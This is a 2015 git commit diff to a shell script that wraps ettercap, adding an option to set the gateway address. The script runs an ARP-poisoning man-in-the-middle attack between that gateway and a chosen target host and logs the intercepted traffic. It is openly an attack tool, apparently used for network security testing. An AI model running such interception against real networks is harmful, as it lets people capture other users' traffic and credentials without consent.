e79954c2043ad6e48b676b72c05188363666bfdc
chenxiaojing123 <chxj1992@gmail.com>
2015-05-14 17:15:50 +0800

    update

--- run.sh
+++ run.sh
@@ -5,9 +5,10 @@ sudo mkdir logs
 
 interface='wlan0'
 filter=''
+gateway='192.168.1.1'
 
 count=1
-while getopts "i:f:" arg
+while getopts "i:f:g:" arg
 do
     case $arg in
         i)
@@ -18,14 +19,19 @@ do
             filter='-F '$OPTARG
             let "count=$count+2"
             ;;
+        g)
+            gateway=$OPTARG
+            let "count=$count+2"
+            ;;
     esac
 done
 
 echo "-----------------------------------------------"
-echo -e "\e[1;33m interface:$interface \e[0m"
-echo -e "\e[1;33m filter: $filter \e[0m"
-echo -e "\e[1;33m target: ${!count} \e[0m"
+echo -e "\e[1;33m Interface: $interface \e[0m"
+echo -e "\e[1;33m Gateway: $gateway \e[0m"
+echo -e "\e[1;33m Filter: $filter \e[0m"
+echo -e "\e[1;33m Target: ${!count} \e[0m"
 echo "-----------------------------------------------"
 
-sudo ettercap -Tq -i $interface -L logs/log $filter -M arp:remote /192.168.1.1// /${!count}//
+sudo ettercap -Tq -i $interface -L logs/log $filter -M arp:remote /$gateway// /${!count}//
 
